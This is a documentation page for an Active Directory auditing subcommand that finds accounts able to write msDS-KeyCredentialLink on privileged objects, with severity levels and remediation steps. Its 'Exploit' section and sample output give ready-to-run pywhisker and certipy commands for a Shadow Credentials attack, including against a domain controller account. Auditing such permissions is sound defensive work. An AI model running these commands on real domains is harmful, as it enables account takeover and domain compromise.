# morok shadow

Detect principals that have write access to `msDS-KeyCredentialLink` on high-value AD objects. This access enables the **Shadow Credentials** attack — obtaining a Kerberos TGT without knowing or changing the target's password.

## Usage

```bash
morok shadow -d <domain> -u <user> -p <pass> --dc <dc>
```

## Flags

Standard auth flags apply. See [Authentication](../getting-started/auth.md).

## What it checks

morok analyzes the `nTSecurityDescriptor` (DACL) of the following high-value targets:

- **Domain Admins** group
- **Enterprise Admins** group
- **Schema Admins** group
- **Domain Controllers** OU / computer objects
- Any other groups with `adminCount=1`

For each target, it looks for ACEs that grant any of these rights to non-privileged principals:

| ACE type | Why it matters |
|----------|----------------|
| `GenericAll` | Full control — includes KeyCredentialLink write |
| `WriteDACL` | Can modify the DACL to grant themselves write |
| `WriteOwner` | Can take ownership, then grant write |
| `GenericWrite` | Includes write to most attributes |
| `WriteProperty (msDS-KeyCredentialLink)` | Direct write to the shadow credential attribute |

## Severity

| Severity | Condition |
|----------|-----------|
| **Critical** | Write access on a DC computer object — can obtain DC TGT, leads to DCSync |
| **High** | Write access on Domain Admins or Enterprise Admins group |
| **Medium** | Write access on Schema Admins or other adminCount=1 objects |

## Output

```
  SHADOW CREDENTIALS
  [Critical] CORP\jsmith → WriteProperty(msDS-KeyCredentialLink) → CN=DC01,OU=Domain Controllers,DC=corp,DC=local
  [High]     CORP\helpdesk → GenericAll → CN=Domain Admins,CN=Users,DC=corp,DC=local

  next steps:
  pywhisker -d corp.local -u jsmith -p 'pass' --target 'DC01$' --action add
  certipy shadow auto -u jsmith@corp.local -p 'pass' -account 'DC01$'
```

## Exploit

```bash
# Add a key credential (pywhisker)
pywhisker -d corp.local -u jsmith -p 'Password1' --target 'targetuser' --action add

# Obtain TGT using the added certificate (certipy)
certipy shadow auto -u jsmith@corp.local -p 'Password1' -account 'targetuser'

# Or with gettgtpkinit.py (PKINITtools)
gettgtpkinit.py corp.local/targetuser -cert-pfx targetuser.pfx -pfx-pass 'generatedpass' targetuser.ccache
```

## Remediation

1. Review and remove excessive write permissions on Domain Admins, Enterprise Admins, and DC objects
2. Enable **Protected Users** security group for all privileged accounts — limits certain Kerberos operations
3. Monitor `msDS-KeyCredentialLink` attribute modifications (Event ID 5136 — Directory Service Changes must be audited)
4. Use **Privileged Access Workstations** — reduce the attack surface for privileged account compromise

## See also

- [Shadow Credentials technique](../techniques/shadow-credentials.md)
